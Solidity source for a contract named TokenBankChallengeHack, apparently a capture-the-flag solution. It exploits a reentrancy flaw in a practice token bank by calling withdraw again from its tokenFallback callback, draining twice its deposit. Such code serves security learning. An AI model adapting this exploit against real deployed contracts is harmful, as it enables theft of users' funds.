pragma solidity 0.8.7;

/** 
 * To Solve this issue, you have to move your balance to HackerContract in both of ISimpleERC223Token and TokenBankChallenge mapping
 * Then attack by reentrancy attack
 */

interface ITokenBankChallenge {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
    function withdraw(uint256 amount) external;
}

interface ISimpleERC223Token {
    function transfer(address to, uint256 value) external returns (bool success);
}

contract TokenBankChallengeHack {
    ITokenBankChallenge public tbcInstance;
    ISimpleERC223Token public sERC223Instance;

    uint256 public count = 0;

    constructor(ITokenBankChallenge _tbcInstance, ISimpleERC223Token _sERC223Instance){ 
        tbcInstance = _tbcInstance;
        sERC223Instance = _sERC223Instance;
    }

    function transferToVictimContract() public {
        sERC223Instance.transfer(address(tbcInstance),(500000 * 10**18));
    }

    function attack() public payable{
        tbcInstance.withdraw((500000 * 10**18));
    }

    function tokenFallback(address from, uint256 value, bytes memory) public {
        if (count == 1 ) {
            count++;
            tbcInstance.withdraw((500000 * 10**18));
        } 
        count++;
    }

    receive() external payable{}
}

